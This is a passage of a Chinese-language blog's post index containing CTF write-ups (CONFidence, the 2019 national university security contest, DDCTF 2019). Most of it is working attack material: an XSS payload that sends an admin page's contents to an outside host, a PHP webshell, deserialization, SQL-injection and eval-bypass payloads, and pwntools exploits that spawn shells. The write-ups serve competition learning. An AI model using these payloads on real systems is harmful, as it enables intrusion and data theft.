href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo\" /&gt;&lt;script&gt; var xmlhttp = new XMLHttpRequest(); var response; xmlhttp.onreadystatechange = function() &#123; if (4 == xmlhttp.readyState) &#123; if (200 == xmlhttp.status) &#123; location.href='http://onsdtb.ceye.io?'+btoa(xmlhttp.responseText); &#125; &#125; &#125;; xmlhttp.open(\"GET\", \"/profile/admin\"); xmlhttp.send();&lt;/script&gt;&lt;/svg&gt; 缓存投毒这里贴一波国外的师傅的writeup：https://ctftime.org/writeup/13925因为这个考点触及到我的知识盲区了，肉鸡决定研究一下 参考","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/25/CONFidence-CTF的一道题/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 全国大学生信息安全竞赛 writeup","date":"2019-04-21T16:00:00.000Z","path":"2019/04/22/2019-全国大学生信息安全竞赛-writeup/","text":"上周末跟队友打了一场国赛，题目质量还是不错的，记录下wp misc签到摄像头检测到三个人头就行了 saleae百度logicdata，发现有个工具，打开就是一些波形，直接对着时钟位读二进制转成ascii码就能出flag了flag{12071397-19d1-48e6-be8c-784b89a95e07}然后无敌头铁王第二天发现SPI通道直接就会转字符了，第一天手撕是真的头铁…… usbasp还是SPI通道，将标准位调高就直接出flag了 webjustsoso一开始伪协议拿到源码，然后就是反序列化利用了123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;html&gt;&lt;?phpindex.phperror_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"];if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;';&#125;if(preg_match(\"/flag/\",$file))&#123; die('hack attacked!!!');&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match(\"/flag/\",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo \"Missing parameters\"; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;hint.php&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt; 可以看到Handle类有个__destruct函数可以触发getFlag函数，但是__wakeup函数会将所有东西清空，这里改下属性个数就能绕过，参考SugerCRM漏洞，然后getFlag函数的条件可以用指针绕过，以前安恒的月赛也考过，最后flag的匹配可以利用parse_url漏洞，三个斜杠就能绕过了exp1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token = &amp;$this-&gt;token_flag; &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag)&#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;$h = new Handle(new Flag('flag.php'));echo urlencode(serialize($h));//$c = \"O:6:\\\"Handle\\\":3:&#123;s:14:\\\"Handlehandle\\\";O:4:\\\"Flag\\\":3:&#123;s:4:\\\"file\\\";s:8:\\\"flag.php\\\";s:5:\\\"token\\\";N;s:10:\\\"token_flag\\\";R:4;&#125;&#125;\"; 全宇宙最简单的sql这道题是报错盲注+mysql load data infile漏洞，比赛时没有做出来还是挺可惜的通过测试网站我们可以知道登陆密码错误的时候会回显登陆失败，如果语句有错的话就会回显数据库操作失败，但是这里有个坑点，可能是因为上了知道创宇的waf所以脚本盲注会出锅？debug一个下午最后发现用burp代理是能跑出来的，攻击语句是&#39; and (select locate(&#39;a&#39;,(select database()),1)=1)*999*pow(999,102)%23攻击出数据库是ctf，因为or被过滤了，所以不能直接爆出表名，想Innodb引擎注入发现权限不够，一度卡了很久，最后猜测表名是user，因为显示的是用户信息，然后，撞对了……获得了表名以后就是不知道列名的联合注入了，语句：&#39; and (select locate(&#39;a&#39;,(select2from (select 1,2 union select * from user)a limit 1,1),1)=1)*999*pow(999,102)%23最后就能爆出来用户名是admin，密码是F1AG@1s_at_/fll1llag_h3r3，这里又来一个坑点，可能服务器不是很好，都不知道跑到哪去了，因此大小写错乱，然后就做不下去了…….算是长个教训吧，以后用ascii码去跑，坑死我了……接下来登录进去就是mysql load data infile漏洞，改下github的脚本就能getflag了 love_math这道题一进去就发现很像网鼎杯的一道题，但是fuzz了一下发现字母全部过滤了？？？然后，莫得了留个坑等大佬们wp出来了学完补还是太菜了，看见有个calc.php却没想到去无参访问一下，结果就拿不到源码卡死了，甚至还以为是ssti……这里贴出源码进行分析12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', 't', 'r', 'n','\\'', '\"', '`', '[', ']']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/'. $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_x7f-xff][a-zA-Z_0-9x7f-xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 可以看到他会限制输入长度小于80，然后匹配黑名单，接着就是找函数，只有白名单的函数才可以继续执行到了这里似乎无解，查看白名单发现有个base_convert函数，进制转换，思考一下，到了&gt;=36进制是可以将字母显示出来的，我们可以考虑一下通过进制转换去getshell接下来就是找个在线网站转一下进制然后直接就行1234#phpinfobase_convert(55490343972,10,36)()#system('ls')base_convert(1751504350,10,36)(base_convert(784,10,36)) 获得了目录以后，就是最重要的读文件了，这里我们需要引入其他参数去打破字符长度的限制最后payload123//这里利用了&#123;&#125;去替代[]进行数组索引$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php//相当于：$pi=_GET;($_GET[pi])($_GET[abs]) RefSpace一进去可以看到一个文件上传的点?route=app/index，利用伪协议将一堆文件读出来，index.php，app/flag.php，app/index.php，backup.zip，然后robots.txt还有一个文件上传的点Up10aD.php ，测试一下发现只能上传jpg和gif文件，尝试了一下截断，一直不成功，最后只能结合文件包含的点和phar协议去进行getshell12$p = new PharData(dirname(__FILE__).'/phartest.aaa', 0,'phartest',Phar::ZIP) ;$p-&gt;addFromString('testfile.php', '&lt;?php phpinfo(); eval($_POST[x])?&gt;'); 将生成的文件改下后缀发上去就能成功getshell了，将所有文件一把梭全部下下来，看下openbase_dir有个ctf目录，继续读看见有个sdk.php和ixed.lin下下来…就做不下了…菜鸡逆向巨差…只知道他是一个sha1加密，有个flag.txt的密文，但是直接在线解密是不可能的，sdk.php已经提示是商业加密了……赛后问了大佬，说可以用反射去做，还是太菜了……1234567use interesting\\FlagSDK; $sdk = new FlagSDK(); $ref = new ReflectionClass($sdk); $instance = $ref-&gt;newInstance();$method = $ref-&gt;getmethod(\"getHash\");$method-&gt;setAccessible(true);echo $method-&gt;invoke($instance); 然后就能拿到getHash出来的值，接下来利用不同的命名空间达到重新定义函数的目的（就是在函数同名的时候，系统会优先调用本命名空间里面的同名函数）123456namespace interesting;function sha1($key)&#123; return \"a356bc8d9d3e69beea3c15d40995f395425e7813\";&#125;$sdk = new \\interesting\\FlagSDK();var_dump($sdk-&gt;verify(\"a\")); 反射这波利用还是很秀的，涨姿势了2333 cryptopuzzle一道集合了脑洞高数和大物的题123456789101112Q0解第一个4元4次方程得到：a1 = 0xfa6a2 = 0xbeda3 = 0x9c7a4 = 0xa00整合下：fa6bed9c7a00Q1: 解出0x1924dd7Q2：手撕算积分：0x1e14Q3: 磁通手撕算出: 0x48d0Q4: 三重积分手撕：0x9d80组合在一起：flag&#123;01924dd7-1e14-48d0-9d80-fa6bed9c7a00&#125; warmup这道题是AES CTR加密，这个加密方式有个缺陷，可以主动攻击，改明文，如果后续的内容不受影响，就能进行攻击连接服务器，首先我们先什么都不输入，获得第一条密文c1，就是flag的密文可知密文是48个字节接下来输入16个1，获得第二条密文c2然后32个1，得到第三条密文c3最后48个1，得到第四条密文c4接下来就是c1分段对应异或得到明文1234567891011121314151617181920212223242526272829303132333435#nulls1 = \"199b7d9256bdcaeff34ee57ed2d6c9646bd185e48e716c5385ab36ff820de3928a8844bc0b48fe93b2002c1c5a4d2c2f\"#16*1s2 = \"4ec62dc41cb5cbe8f11ee679d4caca606cd8c9b7c0296f488fa932ac9816e3c4db880bb95a4bffdbb21e1c7f717d184a5e960812355a6570a55b25536565f0d9\"#32*1s3 = \"4ec62dc41cb5cbe8f11ee679d4caca603b8599e18a216e4f8df931ab9e0ae0c0dc8147ea1413fcc0b81c182c6b66181c0f96471764596438a54515304e55c4bc41c88702fc6d06f14f2d9e8ef115d2e7\"#64*1s4 = \"4ec62dc41cb5cbe8f11ee679d4caca603b8599e18a216e4f8df931ab9e0ae0c08bdc17bc5e1bfdc7ba4c1b2b6d7a1b18089f0b442a016723af471163544ec4ea10c8c807ad6e07b94f33aeedda25e682862a97e2c075dc4013f1f1a836ac9c86\"#cutc1 = s1[:32]c2 = s1[32:64]c3 = s1[64:]b1 = s2[:32]b2 = s3[32:64]b3 = s4[64:96]a1 = [0x19, 0x9b, 0x7d, 0x92, 0x56, 0xbd, 0xca, 0xef, 0xf3, 0x4e, 0xe5, 0x7e, 0xd2, 0xd6, 0xc9, 0x64]a2 = [0x6b, 0xd1, 0x85, 0xe4, 0x8e, 0x71, 0x6c, 0x53, 0x85, 0xab, 0x36, 0xff, 0x82, 0x0d, 0xe3, 0x92]a3 = [0x8a, 0x88, 0x44, 0xbc, 0x0b, 0x48, 0xfe, 0x93, 0xb2, 0x00, 0x2c, 0x1c, 0x5a, 0x4d, 0x2c, 0x2f]b = [0x4e, 0xc6, 0x2d, 0xc4, 0x1c, 0xb5, 0xcb, 0xe8, 0xf1, 0x1e, 0xe6, 0x79, 0xd4, 0xca, 0xca, 0x60]c = [0x3b, 0x85, 0x99, 0xe1, 0x8a, 0x21, 0x6e, 0x4f, 0x8d, 0xf9, 0x31, 0xab, 0x9e, 0x0a, 0xe0, 0xc0]d = [0x8b, 0xdc, 0x17, 0xbc, 0x5e, 0x1b, 0xfd, 0xc7, 0xba, 0x4c, 0x1b, 0x2b, 0x6d, 0x7a, 0x1b, 0x18]# for i in range(16):# k = c3[i*2:i*2+2]# print \"0x\"+k+\",\",for i in range(16): print chr(a1[i]^b[i]^ord('1')),for i in range(16): print chr(a2[i]^c[i]^ord('1')),for i in range(16):print chr(a3[i]^d[i]^ord('1')), pwnyour_pwn64位程序 ，保护全开IDA分析可以发现程序存在一个任意地址读和任意地址写的漏洞，所以就可以泄漏出真实地址，然后onegadget一把梭搞定。因为泄漏与写入都是每次一个字节的，所以需要泄漏6次拼出真实地址，进而循环6次写入onegadget，不过for循环有41次，完全足够。gdb调试得到__libc_start_main+240到v4[0]的偏移循环6次得到__libc_start_main的地址算出偏移得到onegadget地址同样的方法得到返回地址于是v4[0]的偏移循环6次写到onegadget，exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#coding:utf-8from pwn import *context.log_level = 'debug'#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr))) p = process('./pwn')# p = remote(\"1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com\",\"57856\")elf = ELF('./pwn')libc = elf.libcp.recvuntil('name:')p.sendline('n0va')p.recvuntil('input index\\n')p.sendline('632')p.recvuntil('now value(hex) ')a = int(p.recv(2),16)print hex(a)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('633')p.recvuntil('now value(hex) ')b = (int(p.recvuntil('\\n')[:-1],16))&amp;0xffprint hex(b)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('634')p.recvuntil('now value(hex) ')c = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(c)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('635')p.recvuntil('now value(hex) ')d = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(d)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('636')p.recvuntil('now value(hex) ')e = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(e)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('637')p.recvuntil('now value(hex) ')f = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(f)p.recvuntil('input new value\\n')p.sendline('1')print hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)libc_start_main = hex(f)[2:] + hex(e)[2:] + hex(d)[2:] + hex(c)[2:] + hex(b)[2:] + hex(a)[2:]libc_main = int(libc_start_main,16)-240print hex(int(libc_start_main,16))print hex(libc_main)offset = libc_main - libc.symbols['__libc_start_main']one_gadget = offset + 0x45216print \"one_gadget--&gt; \" + hex(one_gadget)# system_addr = libc.symbols['system'] + offset# binsh_addr = libc.search(\"/bin/sh\").next() + offset# print \"system_addr--&gt; \" + hex(system_addr)# print \"binsh_addr--&gt; \" + hex(binsh_addr)a = one_gadget&amp;0xffb = one_gadget&gt;&gt;8&amp;0xffc = one_gadget&gt;&gt;16&amp;0xffd = one_gadget&gt;&gt;24&amp;0xffe = one_gadget&gt;&gt;32&amp;0xfff = one_gadget&gt;&gt;40&amp;0xffprint hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)p.recvuntil('input index\\n')p.sendline('344')p.recvuntil('input new value\\n')p.sendline(str(a))p.recvuntil('input index\\n')p.sendline('345')p.recvuntil('input new value\\n')p.sendline(str(b))p.recvuntil('input index\\n')p.sendline('346')p.recvuntil('input new value\\n')p.sendline(str(c))p.recvuntil('input index\\n')p.sendline('347')p.recvuntil('input new value\\n')p.sendline(str(d))p.recvuntil('input index\\n')p.sendline('348')p.recvuntil('input new value\\n')p.sendline(str(e))p.recvuntil('input index\\n')p.sendline('349')p.recvuntil('input new value\\n')p.sendline(str(f))p.recvuntil('input index\\n')p.sendline('-4')p.sendline('40')p.recvuntil('do you want continue(yes/no)? \\n')p.sendline('no')p.interactive() baby_pwn32位程序 ，只开了NX，打开IDA有一个栈溢出漏洞，没有后门函数，其它的也没有什么可用的，这么干净的栈溢出很容易就想到了runtime_resolve。exp如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']context(arch='amd64', os='linux')# p = process('./pwn')p = remote(\"da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com\",\"33865\")elf = ELF('./pwn')read_plt = elf.plt['read']alarm_got = elf.got['alarm']# write_plt = elf.plt['write']bss_addr = elf.bss()bss_stage1 = 0x800 + bss_addrbss_stage2 = 80 + bss_stage1ppp_ret = 0x080485d9pop_ebp = 0x080485dbleave_ret = 0x08048448#read(0,bss_addr,100)payload = 'a'*44payload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(bss_stage1)payload += p32(100)payload += p32(pop_ebp)payload += p32(bss_stage1)payload += p32(leave_ret)# p.recvuntil('Welcome to XDCTF2015~!\\n')# gdb.attach(p,\"b *0x08048546\")# pause()p.sendline(payload)cmd = '/bin/sh'plt_0 = 0x8048380rel_plt = 0x804833cindex_offset = (bss_stage1+28) - rel_plt# write_got = elf.got['write']dynsym = 0x080481dc #objdump -s -j .dynsym bofdynstr = 0x804827c #objdump -s -j .dynstr boffake_sym_addr = bss_stage1+36align = 0x10 -((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym&lt;&lt;8) | 0x7fack_reloc = p32(alarm_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrst_name = (fake_sym_addr + 0x10) - dynstr #加0x10是因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload = 'aaaa'payload += p32(plt_0)payload += p32(index_offset)payload += 'aaaa'payload += p32(bss_stage2)payload += 'aaaaaaaa'payload += fack_reloc #(bss_stage1+28)的位置payload += 'b'*alignpayload += fake_sym #(bss_stage1+36)的位置 payload += \"system\\x00\"payload += 'a'*(80-len(payload))payload += cmd + '\\x00'# payload += 'a'*(100-len(payload))p.sendline(payload)p.interactive() reeasygo在jmp start_0的下一条汇编下断，r停下在寄存器里就能看到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/22/2019-全国大学生信息安全竞赛-writeup/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 DDCTF web writeup","date":"2019-04-18T16:00:00.000Z","path":"2019/04/19/2019-DDCTF-web-writeup/","text":"这一届的比赛web题虽然脑洞略大，但是还是有很多收获的，记录一下 滴一题大脑洞题……首先进去题目看到参数jpg后面有段字符串，很像base64尝试一下base64解密，又出来一段base64，再解密一次是十六进制，转成字符串是flag.jpg在这里我们可以猜测一下后台可能会读文件出来，我们倒序加密一下index.php去请求看一下回应确实可以拿出index.php的源码12345678910111213141516171819202122232425&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);echo $file.'&lt;/br&gt;';$file = str_replace(\"config\",\"!\", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo \"&lt;img src='data:image/gif;base64,\".$txt.\"'&gt;&lt;/img&gt;\";/* * Can you find the flag file? * */?&gt; 这里就开始第一个大脑洞了……我们看一下源码开头注释的那篇博客可以看到这里有个文件名，访问一下会看到一个文件名注意一下index.php里面的正则，我们要加密的字符串是这个f1agconfigddctf.php我们读取一下这个文件的内容1234567891011121314151617&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 剩下的就是变量覆盖漏洞了?uid=&amp;k= 签到题index.js可以看到一些验证12345678910111213141516171819function auth() &#123; $.ajax(&#123; type: \"post\", url:\"http://117.51.158.44/app/Auth.php\", contentType: \"application/json;charset=utf-8\", dataType: \"json\", beforeSend: function (XMLHttpRequest) &#123; XMLHttpRequest.setRequestHeader(\"didictf_username\", \"\"); &#125;, success: function (getdata) &#123; console.log(getdata); if(getdata.data !== '') &#123; document.getElementById('auth').innerHTML = getdata.data; &#125; &#125;,error:function(error)&#123; console.log(error); &#125; &#125;);&#125; 访问http://117.51.158.44/app/Auth.php同时加上didictf_username的头部，值为admin就能拿到源码了123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153Application.phpclass Application&#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; &#125; public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit(); &#125;&#125;Session.phpinclude 'Application.php';class Session extends Application&#123; //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(\"session not found\",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(\"the cookie data not match\",'error'); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125; 审计源码可以看到12345678if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\");&#125; 可以看到这里有个sprintf函数，同时值可控，这里是个格式化字符串漏洞，我们可以传个admin%s去把key拿出来，是EzblrbNS再接下来就是反序列化的利用了，注意一下路径是flag.txt，也要记得绕一下waf，payload12345$app = new Application();echo serialize($app);$session = \"O:11:\\\"Application\\\":1:&#123;s:4:\\\"path\\\";s:21:\\\"....//config/flag.txt\\\";&#125;77cd55a8d29df4f005f85e536d876525\";$key = \"EzblrbNS\";echo md5($key.$session); upload img考gd库对于图片的渲染漏洞，参考：https://xz.aliyun.com/t/416 大吉大利 今晚吃鸡考了整数溢出和脚本，下单和付款不是同一个整数类型，溢出让票价变小，然后就是大号打小号了12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8import requests,base64,timedef main(): cookie1 = &#123; \"user_name\": \"xiaorouji\", \"REVEL_SESSION\": \"8675885b988d1b153da635cef40710bb\" &#125; for i in xrange(3270,9000): # print i register_url = \"http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=111111111\".format(i) register = requests.get(url=register_url).content login_url = \"http://117.51.147.155:5050//ctf/api/login?name=&#123;&#125;&amp;password=111111111\".format(i) login = requests.get(url=login_url).headers if len(str(login))&gt;200: print \"[+]---------------------------------------\" session = str(login).split(\"=\")[3][:32] cookie = &#123; \"user_name\": str(i), \"REVEL_SESSION\": session &#125; ticket_url = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297\" ticket = requests.get(url=ticket_url,cookies=cookie).content bill_id = ticket[32:68] pay_url = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;\".format(bill_id) pay = requests.get(url=pay_url,cookies=cookie).content pay = str(pay) if \"hash_val\" in pay: robot_token = pay.split(\":\")[3][1:33] robot_id = pay.split(\":\")[4] robot_id = str(robot_id).split(\",\")[0] if \"your_id\" in pay: robot_token = pay.split(\":\")[4][1:33] robot_id = pay.split(\":\")[3] robot_id = str(robot_id).split(\",\")[0] remove_url = \"http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;\".format(robot_id,robot_token) remove = requests.get(url=remove_url,cookies=cookie1).content flag_url = \"http://117.51.147.155:5050/ctf/api/get_flag\" flag = requests.get(url=flag_url,cookies=cookie1).content print \"token: \" + robot_token + \" \" + \"id: \" + robot_id print flag if str(flag)[20:21] == \"0\": breakif __name__ == '__main__': main() mysql弱口令这题利用mysql loal data infile的漏洞去进行任意文件读取，改下GitHub的脚本和agent.py就能拿到flag了https://github.com/Gifts/Rogue-MySql-Server通过读/root/.bash_history文件可以读到flag目录：/var/lib/mysql/security/flag.ibd但是有个坑点，agent.py要改一下才能跑起来，题目其实不难，基础不牢，没能改成功agent.py，比赛没做出来是在遗憾1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 12/1/2019 2:58 PM# @Author : fz# @Site :# @File : agent.py# @Software: PyCharmimport jsonfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandlerfrom optparse import OptionParserfrom subprocess import Popen, PIPEclass RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print(\"\\n----- Request Start -----&gt;\\n\") print(\"request_path :\", request_path) print(\"UA :\", self.headers.getheaders('user-agent')) print(\"self.headers :\", self.headers) print(\"&lt;----- Request End -----\\n\") self.send_response(404) self.send_header(\"Set-Cookie\", \"foo=flag\") self.end_headers() result = self._func() return_str = \"mysqld\" self.wfile.write(return_str) # self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print(\"\\n----- Request Start -----&gt;\\n\") print(\"request_path : %s\", request_path) request_headers = self.headers content_length = request_headers.getheaders('content-length') length = int(content_length[0]) if content_length else 0 # print(\"length :\", length) print(\"request_headers : %s\" % request_headers) print(\"content : %s\" % self.rfile.read(length)) # print(\"&lt;----- Request End -----\\n\") self.send_response(404) self.send_header(\"Set-Cookie\", \"foo=bar\") self.end_headers() result = self._func() return_str = \"mysqld\" 